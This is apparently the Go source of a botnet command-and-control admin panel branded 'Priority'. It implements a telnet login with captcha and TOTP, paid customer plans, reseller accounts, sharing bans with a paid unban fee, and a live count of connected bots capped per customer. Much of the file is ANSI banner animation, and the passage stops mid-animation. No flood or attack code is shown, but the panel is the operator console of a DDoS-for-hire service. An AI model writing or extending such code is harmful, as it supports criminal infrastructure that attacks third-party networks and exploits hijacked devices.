package main

import (
	"database/sql"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/alexeyco/simpletable"
	"github.com/syrinsecurity/gologger"
	"github.com/xlzd/gotp"
)

/*--------------------------------------------------------------------------------------------------------------------------------------------*/

var (
	logger, _        = gologger.New("ServerLogger", 10, gologger.PanicIfFileError)
	sessionLogger, _ = gologger.New("SharingLogger", 10, gologger.PanicIfFileError)
	skipSkidStuff    = false
)

/*--------------------------------------------------------------------------------------------------------------------------------------------*/

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func (this *Admin) Handle() {
	this.conn.Write([]byte("\033[?1049h"))
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	/*--------------------------------------------------------------------------------------------------------------------------------------------*/

	if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; Priority.gov | Human Verification\007"))); err != nil {
		this.conn.Close()
	}

	/*--------------------------------------------------------------------------------------------------------------------------------------------*/

	var code int
	code = (rand.Intn(9)+1)*1000 + (rand.Intn(9)+1)*100 + (rand.Intn(9)+1)*10 + rand.Intn(10)
	this.conn.SetDeadline(time.Now().Add(20 * time.Second))
	this.conn.Write([]byte("\033[0m\r\n"))
	this.conn.Write([]byte("\033[0mPlease Enter The Given Captcha Code.\r\n"))
	this.conn.Write([]byte("\033[0m\r\n"))
	this.conn.Write([]byte("\033[00;1;95mCaptcha - \033[00;1;96m" + strconv.Itoa(code) + "\033[0m: "))
	pin, err := this.ReadLine(false)
	this.conn.Write([]byte("\033[0m\r\n"))

	if err != nil || len(pin) != 4 {
		this.conn.Write([]byte("\r\033[31mCaptcha Incorrect\033[0m\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}

	cc, err := strconv.Atoi(pin)
	if err != nil || cc != code {
		this.conn.Write([]byte("\r\033[31mCaptcha Incorrect\033[0m\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}

	/*--------------------------------------------------------------------------------------------------------------------------------------------*/

	this.conn.Write([]byte(fmt.Sprintf("\033]0; Priority.gov | Enter Username\007")))
	this.conn.SetDeadline(time.Now().Add(15 * time.Second))
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[0m\r\n"))
	this.conn.Write([]byte("                     \033[00;1;95m ▄▄▄\033[00;1;96m·\033[00;1;95m▄▄▄  \033[00;1;96m▪\033[00;1;95m        ▄▄▄  \033[00;1;96m▪\033[00;1;95m  ▄▄▄▄▄ ▄\033[00;1;96m·\033[00;1;95m ▄▌\033[0m\r\n"))
	this.conn.Write([]byte("                     \033[00;1;95m▐█ ▄█▀▄ █\033[00;1;96m·\033[00;1;95m██\033[00;1;96m ▪\033[00;1;95m     ▀▄ █\033[00;1;96m·\033[00;1;95m██\033[00;1;96m •\033[00;1;95m██  ▐█\033[00;1;96m▪\033[00;1;95m██▌\033[0m\r\n"))
	this.conn.Write([]byte("                     \033[00;1;95m ██▀\033[00;1;96m·\033[00;1;95m▐▀▀▄ ▐█\033[00;1;96m·\033[00;1;95m ▄█▀▄ ▐▀▀▄ ▐█\033[00;1;96m·\033[00;1;95m ▐█\033[00;1;96m.▪\033[00;1;95m▐█▌▐█\033[00;1;96m▪\033[0m\r\n"))
	this.conn.Write([]byte("                     \033[00;1;95m▐█\033[00;1;96m▪·•\033[00;1;95m▐█\033[00;1;96m•\033[00;1;95m█▌▐█▌▐█▌\033[00;1;96m.\033[00;1;95m▐▌▐█\033[00;1;96m•\033[00;1;95m█▌▐█▌ ▐█▌\033[00;1;96m·\033[00;1;95m ▐█▀\033[00;1;96m·.\033[0m\r\n"))
	this.conn.Write([]byte("                     \033[00;1;96m.\033[00;1;95m▀   \033[00;1;96m.\033[00;1;95m▀  ▀▀▀▀ ▀█▄▀\033[00;1;96m▪.\033[00;1;95m▀  ▀▀▀▀ ▀▀▀   ▀ \033[00;1;96m•\033[0m\r\n"))
	this.conn.Write([]byte("\033[31m                                       💔\033[0m\r\n"))
	this.conn.Write([]byte("\033[00;1;95m                   ╔════════════════════\033[00;1;96m════════════════════╗\033[0m\r\n"))
	this.conn.Write([]byte("\033[00;1;95m                   ║- - - - - Welcome To\033[00;1;96m \033[34mPriority\033[00;1;96m! - - - - -║\033[0m\r\n"))
	this.conn.Write([]byte("\033[00;1;95m                   ║- - Please Enter You\033[00;1;96mr \033[34mUser\033[00;1;96m And \033[34mPass\033[00;1;96m! - -║\033[0m\r\n"))
	this.conn.Write([]byte("\033[00;1;95m                   ╚════════════════════\033[00;1;96m════════════════════╝\033[0m\r\n"))
	this.conn.Write([]byte("\033[00;1;95m                   ║Please Wait \033[34m10 Mins\033[00;1;96m After A Logout To Log Back In.\033[0m\r\n"))
	this.conn.Write([]byte("\033[0m\r\n"))
	this.conn.Write([]byte("                                   \033[00;1;96m║\033[00;1;95mUsername\033[0m:\033[00;1;95m "))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}

	/*--------------------------------------------------------------------------------------------------------------------------------------------*/

	this.conn.Write([]byte(fmt.Sprintf("\033]0; Priority.gov | Enter Password\007")))
	this.conn.SetDeadline(time.Now().Add(15 * time.Second))
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[0m\r\n"))
	this.conn.Write([]byte("                     \033[00;1;95m ▄▄▄\033[00;1;96m·\033[00;1;95m▄▄▄  \033[00;1;96m▪\033[00;1;95m        ▄▄▄  \033[00;1;96m▪\033[00;1;95m  ▄▄▄▄▄ ▄\033[00;1;96m·\033[00;1;95m ▄▌\033[0m\r\n"))
	this.conn.Write([]byte("                     \033[00;1;95m▐█ ▄█▀▄ █\033[00;1;96m·\033[00;1;95m██\033[00;1;96m ▪\033[00;1;95m     ▀▄ █\033[00;1;96m·\033[00;1;95m██\033[00;1;96m •\033[00;1;95m██  ▐█\033[00;1;96m▪\033[00;1;95m██▌\033[0m\r\n"))
	this.conn.Write([]byte("                     \033[00;1;95m ██▀\033[00;1;96m·\033[00;1;95m▐▀▀▄ ▐█\033[00;1;96m·\033[00;1;95m ▄█▀▄ ▐▀▀▄ ▐█\033[00;1;96m·\033[00;1;95m ▐█\033[00;1;96m.▪\033[00;1;95m▐█▌▐█\033[00;1;96m▪\033[0m\r\n"))
	this.conn.Write([]byte("                     \033[00;1;95m▐█\033[00;1;96m▪·•\033[00;1;95m▐█\033[00;1;96m•\033[00;1;95m█▌▐█▌▐█▌\033[00;1;96m.\033[00;1;95m▐▌▐█\033[00;1;96m•\033[00;1;95m█▌▐█▌ ▐█▌\033[00;1;96m·\033[00;1;95m ▐█▀\033[00;1;96m·.\033[0m\r\n"))
	this.conn.Write([]byte("                     \033[00;1;96m.\033[00;1;95m▀   \033[00;1;96m.\033[00;1;95m▀  ▀▀▀▀ ▀█▄▀\033[00;1;96m▪.\033[00;1;95m▀  ▀▀▀▀ ▀▀▀   ▀ \033[00;1;96m•\033[0m\r\n"))
	this.conn.Write([]byte("\033[31m                                       💔\033[0m\r\n"))
	this.conn.Write([]byte("\033[00;1;95m                   ╔════════════════════\033[00;1;96m════════════════════╗\033[0m\r\n"))
	this.conn.Write([]byte("\033[00;1;95m                   ║- - - - - Welcome To\033[00;1;96m \033[34mPriority\033[00;1;96m! - - - - -║\033[0m\r\n"))
	this.conn.Write([]byte("\033[00;1;95m                   ║- - Please Enter You\033[00;1;96mr \033[34mUser\033[00;1;96m And \033[34mPass\033[00;1;96m! - -║\033[0m\r\n"))
	this.conn.Write([]byte("\033[00;1;95m                   ╚════════════════════\033[00;1;96m════════════════════╝\033[0m\r\n"))
	this.conn.Write([]byte("\033[0m\r\n"))
	this.conn.Write([]byte("                                   \033[00;1;96m║\033[00;1;95mPassword\033[0m:\033[00;1;95m "))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}

	/*--------------------------------------------------------------------------------------------------------------------------------------------*/

	if len(password) > 300 || len(username) > 50 {
		return
	}

	/*--------------------------------------------------------------------------------------------------------------------------------------------*/

	this.conn.Write([]byte(fmt.Sprintf("\033]0; Priority.gov | Loading\007")))
	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
	this.conn.Write([]byte("\033[0m\r\n"))
	for i := 0; i < 100; i = i + 1 {
		lol := "%"
		this.conn.Write([]byte("\033[2J\033[1H"))
		fmt.Fprintf(this.conn, "\033[00;1;95mLoading [\033[00;1;96m%d%s\033[00;1;95m]\r\n", i, lol)
		time.Sleep(time.Millisecond * 30)
		fmt.Fprint(this.conn, "\033[2J\033[1;1H")
	}

	/*--------------------------------------------------------------------------------------------------------------------------------------------*/

	var loggedIn bool
	var userInfo AccountInfo
	if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
		this.conn.Write([]byte("\r\033[00;31mInvalid Credentials. Connection Logged!\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}

	/*--------------------------------------------------------------------------------------------------------------------------------------------*/

	if len(userInfo.mfaSecret) > 1 {
		this.conn.Write([]byte(fmt.Sprintf("\033]0; Priority.gov | 2FA\007")))
		fmt.Fprint(this.conn, "\033[00;1;95mMFA Code\033[0m: ")
		code, err := this.ReadLine(false)
		if err != nil {
			return
		}

		totp := gotp.NewDefaultTOTP(userInfo.mfaSecret)
		if totp.Now() != code {
			fmt.Fprintln(this.conn, "\033[31mInvalid Code!\r")
			return
		}
	}

	/*--------------------------------------------------------------------------------------------------------------------------------------------*/

	if userInfo.tempBan > time.Now().Unix() {
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte(fmt.Sprintf("\033]0; Priority.gov | Banned\007")))
		this.conn.Write([]byte("\033[31mYou Have Been Banned.\033[0m\r\n"))
		this.conn.Write([]byte("\033[31m\033[0m\r\n"))
		fmt.Fprintln(this.conn, "\033[31mDuration Of Ban:", fmt.Sprintf("%.2f", time.Duration(time.Until(time.Unix(userInfo.tempBan, 0))).Hours()/24), "Day(s)\r")
		this.conn.Write([]byte("\033[31mReason Of Ban: Breaking Tos\033[0m\r\n"))
		this.conn.Write([]byte("\033[31mBanned By: Tos Detection Bot\033[0m\r\n"))
		this.conn.Write([]byte("\033[31m\033[0m\r\n"))
		this.conn.Write([]byte("\033[31mTo Be Unbanned You Must Pay a [3$] Fee!\033[0m\r\n"))
		this.conn.Write([]byte("\033[31mYou May Fight The Ban To Be Freely Unbanned!\033[0m\r\n"))
		this.conn.Write([]byte("\033[31mKeep In Mind This Could Be An Accidental Ban!\033[0m\r\n"))
		this.conn.Write([]byte("\033[31m\033[0m\r\n"))
		this.conn.Write([]byte("\033[31mYou WILL NOT Be Able To Be Unbanned If Your Ban Was Malicious.\033[0m\r\n"))
		this.conn.Write([]byte("\033[31m\033[0m\r\n"))
		this.conn.Write([]byte("\033[31mContacts: @rooted.mips | @blazing_runs\033[0m\r\n"))
		time.Sleep(time.Second * 15)
		return
	}

	/*--------------------------------------------------------------------------------------------------------------------------------------------*/

	if userInfo.planExpire < time.Now().Unix() {
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte(fmt.Sprintf("\033]0; Priority.gov | Plan Expired\007")))
		fmt.Fprintln(this.conn, "\033[31mYour Plan Exipred!\r")
		time.Sleep(time.Second * 2)
		return
	}

	/*--------------------------------------------------------------------------------------------------------------------------------------------*/

	for _, session := range sessions {
		if session.Username == username {
			sessionLogger.WriteString(time.Now().Format("Jan 2 15:04:05"), username, "[Sharing Detected] -", this.conn.LocalAddr())
			if database.UserTempBan(username, time.Now().Add(time.Duration(7)*(time.Hour*24)).Unix()) == false {
				fmt.Fprintln(this.conn, "\033[31mFailed To Ban User!\033[0m\r")
				time.Sleep(2000 * time.Millisecond)
				return
			}
		}
	}

	/*--------------------------------------------------------------------------------------------------------------------------------------------*/

	users, err := database.GetUsers()
	if err != nil {
		fmt.Println(err)
		return
	}

	/*--------------------------------------------------------------------------------------------------------------------------------------------*/

	for _, user := range users {
		for _, subordinate := range strings.Split(user.Subordinates, ",") {
			if subordinate == fmt.Sprint(userInfo.ID) {
				if user.PlanExpire < time.Now().Unix() {
					this.conn.SetDeadline(time.Now().Add(2 * time.Second))
					this.conn.Write([]byte(fmt.Sprintf("\033]0; Priority.gov | Resellers Plan Expired\007")))
					fmt.Fprintln(this.conn, "\033[31mYour Resellers Plan Expired!\r")
					return
				}
			}
		}
	}

	/*--------------------------------------------------------------------------------------------------------------------------------------------*/

	var session = &session{
		ID:       time.Now().UnixNano(),
		Username: username,
		Conn:     this.conn,
	}

	sessionMutex.Lock()
	sessions[session.ID] = session
	sessionMutex.Unlock()

	defer session.Remove()

	this.commands(userInfo, username, password, session)
}

/*--------------------------------------------------------------------------------------------------------------------------------------------*/

func (this *Admin) commands(userInfo AccountInfo, username string, password string, session *session) {
	this.conn.Write([]byte("\033[2J\033[1H"))
	go func() {
		i := 0
		for {
			var BotCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}
			time.Sleep(time.Second)
			if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; | [%d] Connections | Identity: %s | Expiry: %s Day(s) | [NoBot] |\007", BotCount, username, fmt.Sprintf("%.2f", time.Duration(time.Until(time.Unix(userInfo.planExpire, 0))).Hours()/24)))); err != nil {
				this.conn.Close()
				break
			}
			i++
			if i%60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()
	if skipSkidStuff == false {
		data, err := ioutil.ReadFile("msg")
		if err != nil {
			return
		}
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╔═╗\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╠═╝\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╩  \033[0m\r\n"))
		time.Sleep(250 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╔═╗                                         ╦ ╦\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╠═╝                                         ╚╦╝\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╩                                            ╩ \033[0m\r\n"))
		time.Sleep(250 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╔═╗  ╦═╗         \033[00;1;96m              ╦ ╦\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╠═╝  ╠╦╝         \033[00;1;96m              ╚╦╝\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╩    ╩╚═         \033[00;1;96m               ╩ \033[0m\r\n"))
		time.Sleep(250 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╔═╗  ╦═╗         \033[00;1;96m         ╔╦╗  ╦ ╦\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╠═╝  ╠╦╝         \033[00;1;96m          ║   ╚╦╝\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╩    ╩╚═         \033[00;1;96m          ╩    ╩ \033[0m\r\n"))
		time.Sleep(250 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╔═╗  ╦═╗  ╦      \033[00;1;96m         ╔╦╗  ╦ ╦\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╠═╝  ╠╦╝  ║      \033[00;1;96m          ║   ╚╦╝\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╩    ╩╚═  ╩      \033[00;1;96m          ╩    ╩ \033[0m\r\n"))
		time.Sleep(250 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╔═╗  ╦═╗  ╦      \033[00;1;96m      ╦  ╔╦╗  ╦ ╦\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╠═╝  ╠╦╝  ║      \033[00;1;96m      ║   ║   ╚╦╝\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╩    ╩╚═  ╩      \033[00;1;96m      ╩   ╩    ╩ \033[0m\r\n"))
		time.Sleep(250 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╔═╗  ╦═╗  ╦  ╔═╗ \033[00;1;96m      ╦  ╔╦╗  ╦ ╦\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╠═╝  ╠╦╝  ║  ║ ║ \033[00;1;96m      ║   ║   ╚╦╝\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╩    ╩╚═  ╩  ╚═╝ \033[00;1;96m      ╩   ╩    ╩ \033[0m\r\n"))
		time.Sleep(250 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╔═╗  ╦═╗  ╦  ╔═╗ \033[00;1;96m ╦═╗  ╦  ╔╦╗  ╦ ╦\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╠═╝  ╠╦╝  ║  ║ ║ \033[00;1;96m ╠╦╝  ║   ║   ╚╦╝\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╩    ╩╚═  ╩  ╚═╝ \033[00;1;96m ╩╚═  ╩   ╩    ╩ \033[0m\r\n"))
		time.Sleep(1200 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╔═╗  ╦═╗  ╦  ╔═╗ \033[00;1;96m ╦═╗  ╦  ╔╦╗  ╦ ╦\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╠═╝  ╠╦╝  ║  ║ ║ \033[00;1;96m ╠╦╝  ║   ║   ╚╦╝\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╩    ╩╚═  ╩  ╚═╝ \033[00;1;96m ╩╚═  ╩   ╩    ╩ \033[0m\r\n"))
		this.conn.Write([]byte("\033[31m                                       💔\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ╔═══════════════════\033[00;1;96m═══════════════════╗\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Setting Up Your Se\033[00;1;96mssion...      [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Clearing Cache... \033[00;1;96m              [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Closing Backround \033[00;1;96mProcesses...  [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Securing Connectio\033[00;1;96mn...          [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Loading Terminal..\033[00;1;96m.             [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ╚═══════════════════\033[00;1;96m═══════════════════╝\033[0m\r\n"))
		time.Sleep(500 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╔═╗  ╦═╗  ╦  ╔═╗ \033[00;1;96m ╦═╗  ╦  ╔╦╗  ╦ ╦\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╠═╝  ╠╦╝  ║  ║ ║ \033[00;1;96m ╠╦╝  ║   ║   ╚╦╝\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╩    ╩╚═  ╩  ╚═╝ \033[00;1;96m ╩╚═  ╩   ╩    ╩ \033[0m\r\n"))
		this.conn.Write([]byte("\033[31m                                       💔\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ╔═══════════════════\033[00;1;96m═══════════════════╗\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Setting Up Your Se\033[00;1;96mssion...      [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Clearing Cache... \033[00;1;96m              [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Closing Backround \033[00;1;96mProcesses...  [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Securing Connectio\033[00;1;96mn...          [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Loading Terminal..\033[00;1;96m.             [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ╚═══════════════════\033[00;1;96m═══════════════════╝\033[0m\r\n"))
		time.Sleep(500 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╔═╗  ╦═╗  ╦  ╔═╗ \033[00;1;96m ╦═╗  ╦  ╔╦╗  ╦ ╦\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╠═╝  ╠╦╝  ║  ║ ║ \033[00;1;96m ╠╦╝  ║   ║   ╚╦╝\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╩    ╩╚═  ╩  ╚═╝ \033[00;1;96m ╩╚═  ╩   ╩    ╩ \033[0m\r\n"))
		this.conn.Write([]byte("\033[31m                                       💔\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ╔═══════════════════\033[00;1;96m═══════════════════╗\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Setting Up Your Se\033[00;1;96mssion...      [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Clearing Cache... \033[00;1;96m              [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Closing Backround \033[00;1;96mProcesses...  [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Securing Connectio\033[00;1;96mn...          [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Loading Terminal..\033[00;1;96m.             [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ╚═══════════════════\033[00;1;96m═══════════════════╝\033[0m\r\n"))
		time.Sleep(500 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╔═╗  ╦═╗  ╦  ╔═╗ \033[00;1;96m ╦═╗  ╦  ╔╦╗  ╦ ╦\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╠═╝  ╠╦╝  ║  ║ ║ \033[00;1;96m ╠╦╝  ║   ║   ╚╦╝\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╩    ╩╚═  ╩  ╚═╝ \033[00;1;96m ╩╚═  ╩   ╩    ╩ \033[0m\r\n"))
		this.conn.Write([]byte("\033[31m                                       💔\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ╔═══════════════════\033[00;1;96m═══════════════════╗\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Setting Up Your Se\033[00;1;96mssion...      [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Clearing Cache... \033[00;1;96m              [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Closing Backround \033[00;1;96mProcesses...  [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Securing Connectio\033[00;1;96mn...          [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Loading Terminal..\033[00;1;96m.             [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ╚═══════════════════\033[00;1;96m═══════════════════╝\033[0m\r\n"))
		time.Sleep(500 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╔═╗  ╦═╗  ╦  ╔═╗ \033[00;1;96m ╦═╗  ╦  ╔╦╗  ╦ ╦\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╠═╝  ╠╦╝  ║  ║ ║ \033[00;1;96m ╠╦╝  ║   ║   ╚╦╝\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╩    ╩╚═  ╩  ╚═╝ \033[00;1;96m ╩╚═  ╩   ╩    ╩ \033[0m\r\n"))
		this.conn.Write([]byte("\033[31m                                       💔\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ╔═══════════════════\033[00;1;96m═══════════════════╗\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Setting Up Your Se\033[00;1;96mssion...      [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Clearing Cache... \033[00;1;96m              [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Closing Backround \033[00;1;96mProcesses...  [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Securing Connectio\033[00;1;96mn...          [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Loading Terminal..\033[00;1;96m.             [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ╚═══════════════════\033[00;1;96m═══════════════════╝\033[0m\r\n"))
		time.Sleep(500 * time.Millisecond)
		this.conn.Write([]byte("\033[2J\033[1H"))
		this.conn.Write([]byte("\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╔═╗  ╦═╗  ╦  ╔═╗ \033[00;1;96m ╦═╗  ╦  ╔╦╗  ╦ ╦\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╠═╝  ╠╦╝  ║  ║ ║ \033[00;1;96m ╠╦╝  ║   ║   ╚╦╝\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                       ╩    ╩╚═  ╩  ╚═╝ \033[00;1;96m ╩╚═  ╩   ╩    ╩ \033[0m\r\n"))
		this.conn.Write([]byte("\033[31m                                       💔\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ╔═══════════════════\033[00;1;96m═══════════════════╗\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Setting Up Your Se\033[00;1;96mssion...      [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
		this.conn.Write([]byte("\033[00;1;95m                    ║ Clearing Cache... \033[00;1;96m              [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
